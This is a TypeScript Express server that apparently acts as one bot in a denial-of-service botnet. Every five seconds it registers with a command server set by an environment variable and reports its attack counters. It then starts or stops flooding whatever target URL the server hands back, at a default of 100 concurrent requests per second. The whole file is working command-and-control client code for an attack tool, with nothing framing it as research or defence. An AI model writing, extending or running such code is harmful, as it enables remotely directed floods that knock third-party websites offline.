import express from "express";
import bodyParser from "body-parser";
import { Stats } from "./stats";
import { Attacker } from "./attacker";
import cors from "cors";
import request from "request";

// Create Express server
const app = express();
const stats = new Stats();
const attacker = new Attacker(stats);


// Express configuration
app.set("port", process.env.PORT || 8080);
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cors({origin: '*',}));
app.get('/', (req, res) => {
    res.status(200).send(stats.isRun);
});

const sendUpdate = () => {
    try {
        if(!stats.isRun) {
            stats.reset();
        }

        const url = `${process.env.CMD_URL}api/control/register`;
        request.post({
            url,
            json: true,
            body: { botUrl: process.env.URL, loop: stats.loop, success: stats.success, error: stats.error }
        }, (err, res) => {
            if(err) {
                console.error(err);
                return;
            }
            if(stats.isRun && !res.body.target) {
                attacker.stop();
                console.log(`Attack stopped`);
            } else if(!stats.isRun && res.body.target) {
                attacker.run(res.body.target.url, res.body.target.concurrency || 100, res.body.target.interval || 1000);
                console.log(`Attack started for ${res.body.target.url}`);
            }
        });
    } catch(err) {
        console.error(err);
    }
};

setInterval(sendUpdate, 5000);
sendUpdate();

export default app;
